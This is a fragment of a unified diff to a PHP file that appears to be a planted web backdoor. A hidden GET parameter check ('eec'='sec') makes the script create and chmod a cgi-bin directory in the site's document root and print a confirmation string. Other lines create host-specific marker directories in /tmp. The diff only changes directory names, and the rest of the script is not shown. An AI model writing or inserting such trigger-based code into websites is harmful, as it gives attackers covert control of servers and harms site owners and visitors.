@@ -1,6 +1,6 @@
 <?php 
 if(isset($_GET["eec"])&&$_GET["eec"]=="sec"){ 
-mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-et");
+mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 echo('Eec secra');
 
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
@@ -22,8 +22,8 @@ die();  }
 
 $random = rand(1,6);
 $d=$_SERVER['HTTP_HOST'];
-if(file_exists('/tmp/443f3fgbdd'.$d.$random)) { } else {
-	mkdir('/tmp/443f3fgbdd'.$d.$random);
+if(file_exists('/tmp/23432ffffs'.$d.$random)) { } else {
+	mkdir('/tmp/23432ffffs'.$d.$random);
 	@chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin", 0755);
 	mkdir($_SERVER['DOCUMENT_ROOT']."/cgi-bin");
 	
